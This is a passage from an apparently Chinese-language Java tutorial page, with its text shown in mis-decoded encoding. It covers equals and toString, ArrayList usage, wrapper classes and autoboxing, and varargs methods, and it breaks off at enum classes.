true;</code></li><li>Ê£ÄÊµã<code>otherObject</code>ÊòØÂê¶‰∏∫nullÔºåÂ¶ÇÊûú‰∏∫nullÔºåËøîÂõûfalse„ÄÇËøôÈ°πÊ£ÄÊµãÊòØÂæàÂøÖË¶ÅÁöÑ„ÄÇ<br><code>if(otherObject == null) return false;</code></li><li>ÊØîËæÉthis‰∏é<code>otherObject</code>ÁöÑÁ±ª„ÄÇÂ¶ÇÊûú<code>equals</code>ÁöÑËØ≠‰πâÂèØ‰ª•Âú®Â≠êÁ±ª‰∏≠ÊîπÂèòÔºåÈÇ£Â∞±‰ΩøÁî®<code>getClass</code>Ê£ÄÊµãÔºö<br><code>if(getClass() != otherObject.getClass()) return false;</code><br>Â¶ÇÊûúÊâÄÊúâÁöÑÂ≠êÁ±ªÈÉΩÊúâÁõ∏ÂêåÁöÑÁõ∏Á≠âÊÄßËØ≠‰πâÔºåÂèØ‰ª•‰ΩøÁî®<code>instanceof</code>Ê£ÄÊµãÔºö<br><code>if(!(otherObject instanceof ClassName)) return false;</code></li><li>Â∞Ü<code>otherObject</code>Âº∫Âà∂ËΩ¨Êç¢‰∏∫Áõ∏Â∫îÁ±ªÁ±ªÂûãÁöÑÂèòÈáèÔºö<br><code>ClassName other = (ClassName) otherObject;</code></li><li>Ê†πÊçÆÁõ∏Á≠âÊÄßÊ¶ÇÂøµÁöÑË¶ÅÊ±ÇÊù•ÊØîËæÉÂ≠óÊÆµ„ÄÇ‰ΩøÁî®<code>==</code>ÊØîËæÉÂü∫Êú¨Á±ªÂûãÂ≠óÊÆµÔºå‰ΩøÁî®<code>Objects.equals</code>ÊØîËæÉÂØπË±°Â≠óÊÆµ„ÄÇÂ¶ÇÊûúÊâÄÊúâÁöÑÂ≠óÊÆµÈÉΩÂåπÈÖçÔºåÂ∞±ËøîÂõûtrueÔºõÂê¶ÂàôËøîÂõûfalse„ÄÇ<br>Â¶ÇÊûúÂú®Â≠êÁ±ª‰∏≠ÈáçÊñ∞ÂÆö‰πâ<code>equals</code>ÔºåÂ∞±Ë¶ÅÂú®ÂÖ∂‰∏≠ÂåÖÂê´‰∏Ä‰∏™<code>super.equals(other)</code>ÁöÑË∞ÉÁî®„ÄÇ</li></ol><blockquote><p>ÂØπ‰∫éÊï∞ÁªÑÁ±ªÂûãÁöÑÂ≠óÊÆµÔºåÂèØ‰ª•‰ΩøÁî®ÈùôÊÄÅÁöÑ<code>Arrays.equals</code>ÊñπÊ≥ïÊ£ÄÊµãÁõ∏Â∫îÁöÑÊï∞ÁªÑÂÖÉÁ¥†ÊòØÂê¶Áõ∏Á≠â„ÄÇ</p></blockquote><p>ÂèØ‰ª•‰ΩøÁî®<code>@Override</code>Ê†áËÆ∞Ë¶ÅË¶ÜÁõñË∂ÖÁ±ªÊñπÊ≥ïÁöÑÈÇ£‰∫õÂ≠êÁ±ªÊñπÊ≥ïÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> otherObject<span class="token punctuation">)</span></code></pre><p>Â¶ÇÊûúÂá∫Áé∞‰∫ÜÈîôËØØÔºåÂπ∂‰∏îÊ≠£Âú®ÂÆö‰πâ‰∏Ä‰∏™Êñ∞ÊñπÊ≥ïÔºåÁºñËØëÂô®Â∞±‰ºöÊä•Âëä‰∏Ä‰∏™ÈîôËØØ„ÄÇ</p><p>‰æãÂ¶ÇËøôÊ†∑ÔºåÂπ∂Ê≤°ÊúâË¶ÜÁõñ<code>Object</code>Á±ªÁöÑ<code>equals</code>ÊñπÊ≥ïÔºåÂõ†Ê≠§‰ºöÊä•ÂëäÈîôËØØÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> otherObject<span class="token punctuation">)</span></code></pre><h4 id="toStringÊñπÊ≥ï"><a href="#toStringÊñπÊ≥ï" class="headerlink" title="toStringÊñπÊ≥ï"></a><code>toString</code>ÊñπÊ≥ï</h4><p>ËøîÂõûË°®Á§∫ÂØπË±°ÂÄºÁöÑ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤„ÄÇ</p><p>Âè™Ë¶ÅÂØπË±°‰∏é‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÈÄöËøáÊìç‰ΩúÁ¨¶ ‚Äú+‚ÄùËøûÊé•Ëµ∑Êù•ÔºåJavaÁºñËØëÂô®Â∞±‰ºöËá™Âä®Âú∞Ë∞ÉÁî®<code>toString</code>ÊñπÊ≥ïÊù•Ëé∑ÂæóËøô‰∏™ÂØπË±°ÁöÑÂ≠óÁ¨¶‰∏≤ÊèèËø∞„ÄÇ</p><blockquote><p>ÂèØ‰ª•‰∏çÂÜô‰∏∫<code>x.toString()</code>ÔºåËÄåÂÜô‰Ωú<code>&quot;&quot;+x</code>„ÄÇ‰∏é<code>toString</code>‰∏çÂêåÁöÑÊòØÔºåÂç≥‰ΩøxÊòØÂü∫Êú¨Á±ªÂûãÔºåËøôÊù°ËØ≠Âè•ÁÖßÊ†∑ËÉΩÂ§üÊâßË°å„ÄÇ</p></blockquote><p>ÊâìÂç∞Êï∞ÁªÑÂà©Áî®<code>Arrays.toString</code>Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="Ê≥õÂûãÊï∞ÁªÑÂàóË°®"><a href="#Ê≥õÂûãÊï∞ÁªÑÂàóË°®" class="headerlink" title="Ê≥õÂûãÊï∞ÁªÑÂàóË°®"></a>Ê≥õÂûãÊï∞ÁªÑÂàóË°®</h3><p><code>ArrayList</code>ÊòØ‰∏Ä‰∏™ÊúâÁ±ªÂûãÂèÇÊï∞ÁöÑÊ≥õÂûãÁ±ª„ÄÇ‰∏∫‰∫ÜÊåáÂÆöÊï∞ÁªÑÂàóË°®‰øùÂ≠òÁöÑÂÖÉÁ¥†ÂØπË±°ÁöÑÁ±ªÂûãÔºåÈúÄË¶ÅÁî®‰∏ÄÂØπÂ∞ñÊã¨Âè∑Â∞ÜÁ±ªÂêçÊã¨Ëµ∑Êù•ËøΩÂä†Âà∞<code>ArrayList</code>ÂêéÈù¢Ôºå‰æãÂ¶Ç<code>ArrayList&lt;Integer&gt;</code>„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> staff3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ÊúÄÂ•Ω‰ΩøÁî®varÂÖ≥ÈîÆÂ≠ó‰ª•ÈÅøÂÖçÈáçÂ§çÂÜôÁ±ªÂêçÔºõÂ¶ÇÊûúÊ≤°Êúâ‰ΩøÁî®varÂÖ≥ÈîÆÂ≠óÔºåÂèØ‰ª•ÁúÅÂéªÂè≥ËæπÁöÑÁ±ªÂûãÂèÇÊï∞„ÄÇÔºàËè±ÂΩ¢ËØ≠Ê≥ïÔºâ</p><p>ÂΩìÁÑ∂ËøòÂèØ‰ª•ÊääÂàùÂßãÂÆπÈáè‰º†ÈÄíÁªô<code>ArrayListÊûÑÈÄ†Âô®</code>Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><blockquote><p>Êï∞ÁªÑÂàóË°®ÁöÑÂÆπÈáè‰∏éÊï∞ÁªÑÁöÑÂ§ßÂ∞èÊúâ‰∏Ä‰∏™ÈùûÂ∏∏ÈáçË¶ÅÁöÑÂå∫Âà´„ÄÇÂ¶ÇÊûúÂàÜÈÖç‰∏Ä‰∏™Êúâ100‰∏™ÂÖÉÁ¥†ÁöÑÊï∞ÁªÑÔºåÊï∞ÁªÑÂ∞±Êúâ100‰∏™Á©∫‰ΩçÁΩÆÂèØ‰ª•‰ΩøÁî®„ÄÇËÄåÂÆπÈáè‰∏∫100‰∏™ÂÖÉÁ¥†ÁöÑÊï∞ÁªÑÂàóË°®Âè™ÊòØ<strong>ÂèØËÉΩ</strong>‰øùÂ≠ò100‰∏™ÂÖÉÁ¥†„ÄÇ‰ΩÜÊòØÂú®ÊúÄÂàùÔºåÁîöËá≥ÂÆåÊàêÂàùÂßãÂåñÊûÑÈÄ†‰πãÂêéÔºåÊï∞ÁªÑÂàóË°®‰∏çÂåÖÂê´‰ªª‰ΩïÂÖÉÁ¥†„ÄÇ</p></blockquote><p>‰ΩøÁî®<strong>add</strong>ÊñπÊ≥ïÂèØ‰ª•Â∞ÜÂÖÉÁ¥†Ê∑ªÂä†Âà∞Êï∞ÁªÑÂàóË°®‰∏≠„ÄÇÂ¶ÇÊûúÈúÄË¶ÅÂú®Êï∞ÁªÑÂàóË°®ÁöÑ‰∏≠Èó¥ÊèíÂÖ•ÂÖÉÁ¥†ÔºåÂèØ‰ª•‰ΩøÁî®addÊñπÊ≥ïÂπ∂Êèê‰æõ‰∏Ä‰∏™Á¥¢ÂºïÂèÇÊï∞„ÄÇ</p><p>Ë¶ÅËÆæÁΩÆÁ¨¨i‰∏™ÂÖÉÁ¥†ÔºåÂèØ‰ª•‰ΩøÁî®<code>set</code>„ÄÇ</p><p>Ë¶ÅÂæóÂà∞Êï∞ÁªÑÂàóË°®ÁöÑÂÖÉÁ¥†ÔºåÂèØ‰ª•‰ΩøÁî®<code>get</code>„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//feng</span>staff<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"hhh"</span><span class="token punctuation">,</span><span class="token number">3456</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//hhh</span></code></pre><blockquote><p>Âè™ÊúâÂΩìÊï∞ÁªÑÂàóË°®ÁöÑÂ§ßÂ∞èÂ§ß‰∫éiÊó∂ÔºåÊâçËÉΩÂ§üË∞ÉÁî®<code>list.set(i,x)</code>„ÄÇsetÊñπÊ≥ïÂè™ÊòØÁî®Êù•ÊõøÊç¢Êï∞ÁªÑ‰∏≠Â∑≤ÁªèÂä†ÂÖ•ÁöÑÂÖÉÁ¥†„ÄÇ</p></blockquote><p>sizeÊñπÊ≥ïÂ∞ÜËøîÂõûÊï∞ÁªÑÂàóË°®‰∏≠ÂåÖÂê´ÁöÑ<strong>ÂÆûÈôÖÂÖÉÁ¥†‰∏™Êï∞</strong>„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//1</span></code></pre><p><code>remove</code>ÊñπÊ≥ïÂèØ‰ª•‰ªéÊï∞ÁªÑÂàóË°®‰∏≠Èó¥Âà†Èô§‰∏Ä‰∏™ÂÖÉÁ¥†Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//1</span><span class="token class-name">Employee</span> e <span class="token operator">=</span> staff<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//feng</span></code></pre><p>ÂèØ‰ª•‰ΩøÁî®<code>for each</code>Âæ™ÁéØÈÅçÂéÜÊï∞ÁªÑÂàóË°®ÁöÑÂÜÖÂÆπÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng1"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng2"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng3"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng4"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> e<span class="token operator">:</span>staff<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="ÂØπË±°ÂåÖË£ÖÂô®‰∏éËá™Âä®Ë£ÖÁÆ±"><a href="#ÂØπË±°ÂåÖË£ÖÂô®‰∏éËá™Âä®Ë£ÖÁÆ±" class="headerlink" title="ÂØπË±°ÂåÖË£ÖÂô®‰∏éËá™Âä®Ë£ÖÁÆ±"></a>ÂØπË±°ÂåÖË£ÖÂô®‰∏éËá™Âä®Ë£ÖÁÆ±</h3><p>ÊâÄÊúâÁöÑÂü∫Êú¨Á±ªÂûãÈÉΩÊúâ‰∏Ä‰∏™‰∏é‰πãÂØπÂ∫îÁöÑÁ±ª„ÄÇËøô‰∫õÁ±ªÁß∞‰∏∫ÂåÖË£ÖÂô®„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Integer</span><span class="token punctuation">,</span><span class="token class-name">Long</span><span class="token punctuation">,</span><span class="token class-name">Float</span><span class="token punctuation">,</span><span class="token class-name">Double</span><span class="token punctuation">,</span><span class="token class-name">Short</span><span class="token punctuation">,</span><span class="token class-name">Byte</span><span class="token punctuation">,</span><span class="token class-name">Character</span><span class="token punctuation">,</span><span class="token class-name">Boolean</span> <span class="token punctuation">(</span>ÂâçÂÖ≠‰∏™Á±ªÊ¥æÁîü‰∫éÂÖ¨ÂÖ±ÁöÑË∂ÖÁ±ª<span class="token class-name">Number</span><span class="token punctuation">)</span></code></pre><p>ÂåÖË£ÖÂô®Á±ªÊòØ‰∏çÂèØÂèòÁöÑÔºåÂç≥‰∏ÄÊó¶ÊûÑÈÄ†‰∫ÜÂåÖË£ÖÂô®ÔºåÂ∞±‰∏çÂÖÅËÆ∏Êõ¥ÊîπÂåÖË£ÖÂú®ÂÖ∂‰∏≠ÁöÑÂÄº„ÄÇÂêåÊó∂ÔºåÂåÖË£ÖÂô®Á±ªÂûãËøòÊòØ<code>final</code>ÔºåÂõ†Ê≠§‰∏çËÉΩÊ¥æÁîüÂÆÉ‰ª¨ÁöÑÂ≠êÁ±ª„ÄÇ</p><p>ÂØπ‰∫é<code>ArrayList</code>ÔºåÂ∞ñÊã¨Âè∑‰∏≠ÁöÑÁ±ªÂûã‰∏çÂÖÅËÆ∏ÊòØÂü∫Êú¨Á±ªÂûãÔºåÂõ†Ê≠§Ë¶ÅÁî®Âà∞ÂåÖË£ÖÂô®Á±ªÔºå‰æãÂ¶Ç<code>Integer</code>Á≠â„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integet</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ÂØπ‰∫éËøôÁßçË∞ÉÁî®</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> list <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Â∞ÜËá™Âä®ÂèòÊàêÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> list <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ËøôÁßçÂèòÊç¢Áß∞‰∏∫Ëá™Âä®Ë£ÖÁÆ±„ÄÇ</p><p>Áõ∏ÂèçÁöÑÔºåÊää<code>Integet</code>ËµãÁªô‰∏Ä‰∏™<code>int</code>Êó∂Ôºå‰ºöËá™Âä®ÊãÜÁÆ±Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> n <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Ë£ÖÁÆ±ÂíåÊãÜÁÆ±ÊòØÁºñËØëÂô®Ë¶ÅÂÅöÁöÑÂ∑•‰ΩúÔºåËÄå‰∏çÊòØËôöÊãüÊú∫„ÄÇ<strong>ÁºñËØëÂô®</strong>Âú®ÁîüÊàêÁ±ªÁöÑÂ≠óËäÇÁ†ÅÊó∂‰ºöÊèíÂÖ•ÂøÖË¶ÅÁöÑÊñπÊ≥ïË∞ÉÁî®„ÄÇ<strong>ËôöÊãüÊú∫</strong>Âè™ÊòØÊâßË°åËøô‰∫õÂ≠óËäÇÁ†Å„ÄÇ</p><h3 id="ÂèÇÊï∞Êï∞ÈáèÂèØÂèòÁöÑÊñπÊ≥ï"><a href="#ÂèÇÊï∞Êï∞ÈáèÂèØÂèòÁöÑÊñπÊ≥ï" class="headerlink" title="ÂèÇÊï∞Êï∞ÈáèÂèØÂèòÁöÑÊñπÊ≥ï"></a>ÂèÇÊï∞Êï∞ÈáèÂèØÂèòÁöÑÊñπÊ≥ï</h3><p>ÂèØ‰ª•Êèê‰æõÂèÇÊï∞Êï∞ÈáèÂèØÂèòÁöÑÊñπÊ≥ïÔºàÊúâÊó∂Ëøô‰∫õÊñπÊ≥ïË¢´Áß∞‰∏∫‚ÄùÂèòÂèÇ‚Äù(varargs)ÊñπÊ≥ïÔºâ„ÄÇ</p><p>ËøôÈáåÁöÑÁúÅÁï•Âè∑<code>...</code>ÊòØJava‰ª£Á†ÅÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÂÆÉË°®ÊòéËøô‰∏™ÊñπÊ≥ïÂèØ‰ª•Êé•Êî∂‰ªªÊÑèÊï∞ÈáèÁöÑÂØπË±°„ÄÇ‰æãÂ¶ÇÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printNumber</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">456</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printNumber</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> numbers<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">double</span> e<span class="token operator">:</span>numbers<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>ÂÖÅËÆ∏Â∞ÜÊï∞ÁªÑ‰Ωú‰∏∫ÊúÄÂêé‰∏Ä‰∏™ÂèÇÊï∞‰º†ÈÄíÁªôÂèØÂèòÂèÇÊï∞ÁöÑÊñπÊ≥ï„ÄÇ</p><p>Âõ†Ê≠§ÔºåÂ¶ÇÊûú‰∏Ä‰∏™Â∑≤ÊúâÊñπÊ≥ïÁöÑÊúÄÂêé‰∏Ä‰∏™ÂèÇÊï∞ÊòØÊï∞ÁªÑÔºåÂèØ‰ª•ÊääÂÆÉÈáçÊñ∞ÂÆö‰πâ‰∏∫ÊúâÂèØÂèòÂèÇÊï∞ÁöÑÊñπÊ≥ïÔºåËÄå‰∏ç‰ºöÁ†¥Âùè‰ªª‰ΩïÂ∑≤ÊúâÁöÑ‰ª£Á†Å„ÄÇ</p></blockquote><h3 id="Êûö‰∏æÁ±ª"><a href="#Êûö‰∏æÁ±ª" class="headerlink" title="Êûö‰∏æÁ±ª"></a>Êûö‰∏æÁ±ª</h3><p>ÂÆö‰πâÊûö‰∏æÁ±ªÂûãÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> 